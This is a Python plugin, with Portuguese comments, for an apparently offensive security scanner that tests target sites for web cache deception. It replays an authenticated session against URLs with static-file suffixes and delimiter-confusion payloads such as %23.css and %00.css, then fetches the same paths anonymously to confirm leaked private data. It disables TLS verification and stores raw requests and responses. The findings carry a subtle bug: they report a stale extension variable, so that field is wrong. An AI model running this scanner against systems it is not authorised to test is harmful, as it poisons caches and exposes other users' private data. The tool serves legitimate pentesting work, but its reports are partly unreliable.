#!/usr/bin/env python3
"""
Web Cache Deception Scanner — Detecção real de cache deception
Compara respostas com e sem path extension para detectar caching indevido
Captura raw request/response
"""
import json
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import urlparse

from menu import C
from plugins import ensure_outdir
from ..output import info, success, warn, error
from ..http_utils import format_raw_request, format_raw_response

try:
    import httpx
except ImportError:
    httpx = None


CACHE_EXTENSIONS = [
    ".css", ".js", ".jpg", ".png", ".gif", ".ico", ".svg",
    ".woff", ".woff2", ".ttf", ".eot",
    ".json", ".xml",
]

# V10.4: Path delimiter confusion payloads
CACHE_DELIMITER_PAYLOADS = [
    "%23.css",    # # encoded → some CDNs use fragment as path
    "%3F.css",    # ? encoded → query string confusion
    ";.css",      # semicolon → path parameter delimiter (Tomcat, Spring)
    "%00.css",    # null byte → truncation
    "/.css",      # extra slash
]

CACHE_HEADERS = [
    "x-cache", "cf-cache-status", "x-varnish", "age",
    "x-fastly-request-id", "x-served-by", "x-cache-hits",
]


def test_cache_deception(client, url, auth_headers):
    """Testa cache deception injetando state e validando diff anônimo"""
    findings = []
    
    try:
        # 1. Baseline: Dados restritos do usuário (Logado)
        r_auth = client.get(url, headers=auth_headers, timeout=10)
        if r_auth.status_code != 200 or len(r_auth.text) < 100:
            return [] # Só prosseguimos em rotas válidas de usuário
            
        # 2. Baseline: Dados Anônimos (Deslogado)
        r_anon_base = client.get(url, timeout=10)
        
        import difflib
        # Se Anônimo e Logado forem quase iguais, a rota é publica ou auth falhou. Aborta!
        if len(r_anon_base.text) > 0:
            ratio_base = difflib.SequenceMatcher(None, r_auth.text[:2000], r_anon_base.text[:2000]).ratio()
            if ratio_base > 0.95:
                # O auth nao teve efeito na resposta ou rota pública
                return [] 
                
        # 3. Ataque: OCDN State Poisoning
        # V10.6: Testar extensões normais + delimiter confusion payloads
        all_payloads = []
        for ext in CACHE_EXTENSIONS[:3]:
            all_payloads.append(f"/wcd_test{ext}")
        for delim in CACHE_DELIMITER_PAYLOADS:
            all_payloads.append(f"/wcd_test{delim}")
        
        for payload_path in all_payloads:
            test_url = url.rstrip("/") + payload_path
            
            # 3.A: Vítima (logada) acessa link falso, forçando o CDN edge a cachear seus dados como arquivo estático
            try:
                client.get(test_url, headers=auth_headers, timeout=10)
            except Exception: continue
            
            # 3.B: Atacante (Anônimo) acessa o mesmo link instantaneamente
            try:
                r_leak = client.get(test_url, timeout=10)
            except Exception: continue
            
            if r_leak.status_code == 200:
                # O atacante anônimo conseguiu ver a mesma tela do usuário logado?
                leak_ratio = difflib.SequenceMatcher(None, r_auth.text[:5000], r_leak.text[:5000]).ratio()
                anon_to_leak_ratio = difflib.SequenceMatcher(None, r_anon_base.text[:5000], r_leak.text[:5000]).ratio()
                
                # Para ser leak: O leak deve ser similar ao perfil do usuário logado E diferente daperfil deslogado padrão
                if leak_ratio > 0.85 and anon_to_leak_ratio < 0.85:
                    
                    cache_info = ""
                    for ch in CACHE_HEADERS:
                        val = r_leak.headers.get(ch, "")
                        if val: cache_info += f"{ch}: {val}; "
                            
                    raw_req = format_raw_request("GET", test_url, dict(r_leak.request.headers))
                    raw_res = format_raw_response(r_leak.status_code, dict(r_leak.headers), r_leak.text[:2000])
                    
                    findings.append({
                        "url": url,
                        "test_url": test_url,
                        "type": "WEB CACHE DECEPTION",
                        "extension": ext,
                        "risk": "CRITICAL",
                        "status": r_leak.status_code,
                        "cache_headers": cache_info,
                        "similarity": f"{leak_ratio:.0%}",
                        "details": f"Informações privadas do usuário foram cacheadas no CDN (Edge) por conta da extensão {ext} e vazadas em sessões anônimas.",
                        "request_raw": raw_req,
                        "response_raw": raw_res,
                    })
                    break # Somente 1 leak por URL está ótimo
                    
    except Exception:
        pass
    
    return findings


def run(context: dict):
    target = context.get("target")
    if not target: raise ValueError("Target required")
    if not httpx: return []

    info(
        f"\n🟦───────────────────────────────────────────────────────────🟦\n"
        f"   🗃️  {C.BOLD}{C.CYAN}WEB CACHE DECEPTION (WCD) SCANNER{C.END}\n"
        f"   🎯 Alvo: {C.GREEN}{target}{C.END}\n"
        f"🟦───────────────────────────────────────────────────────────🟦\n"
    )

    outdir = ensure_outdir(target, "cache_deception")
    results_file = outdir / "cache_deception.json"
    
    # Obter credenciais para realizar o Diff
    auth_data = context.get("cookie", "")
    auth_file = Path("output") / target / "auth_session.txt"
    if not auth_data and auth_file.exists():
        auth_data = auth_file.read_text(errors="ignore").strip()
        
    if not auth_data:
        info("   [i] Não há conta autenticada (auth_session.txt). WCD completo pulado na varredura anônima.")
        results_file.write_text("[]")
        return [str(results_file)]
        
    info("   [+] Baseline de Autenticação Carregada com sucesso!")
    # Formatação automática inteligente do cabeçalho de Auth
    auth_headers = {}
    if ":" in auth_data and "Cookie" not in auth_data:
        key, val = auth_data.split(":", 1)
        auth_headers[key.strip()] = val.strip()
    elif "=" in auth_data and "Bearer" not in auth_data:
        auth_headers["Cookie"] = auth_data
    else:
        auth_headers["Authorization"] = auth_data
    
    urls_file = Path("output") / target / "urls" / "urls_200.txt"
    if not urls_file.exists(): urls_file = Path("output") / target / "domain" / "urls_valid.txt"
    if not urls_file.exists(): return []
    
    all_urls = [l.strip() for l in urls_file.read_text().splitlines() if l.strip()]
    static_exts = {".js", ".css", ".png", ".jpg", ".gif", ".svg", ".ico", ".woff", ".woff2"}
    testable = [u for u in all_urls if not any(urlparse(u).path.lower().endswith(e) for e in static_exts)][:100]
    
    if not testable:
        info("   [i] Nenhuma URL dinâmica propensa a Cache Deception identificada.")
        results_file.write_text("[]")
        return [str(results_file)]
    
    info(f"   📊 Disparando Teste Multi-Fase (Base >> Poison >> Leak) em {len(testable)} URLs dinâmicas...")
    all_findings = []
    
    with httpx.Client(verify=False, follow_redirects=True, timeout=15) as client:
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = {executor.submit(test_cache_deception, client, url, auth_headers): url for url in testable}
            
            for future in as_completed(futures):
                try:
                    results = future.result()
                    if results:
                        all_findings.extend(results)
                        for r in results:
                            info(f"   🚨 {C.RED}Web Cache Deception Confirmado:{C.END} Dados Privados Vazaram em {r['test_url']}")
                except Exception as e: pass
    
    results_file.write_text(json.dumps(all_findings, indent=2, ensure_ascii=False))
    if all_findings:
        success(f"\n☢️  {len(all_findings)} endpoints CRÍTICOS com Web Cache Deception exportados!")
    else:
        success("\n✅ CDN/Edges Resilientes: Nenhum Web Cache Deception econtrado.")
    
    return [str(results_file)]
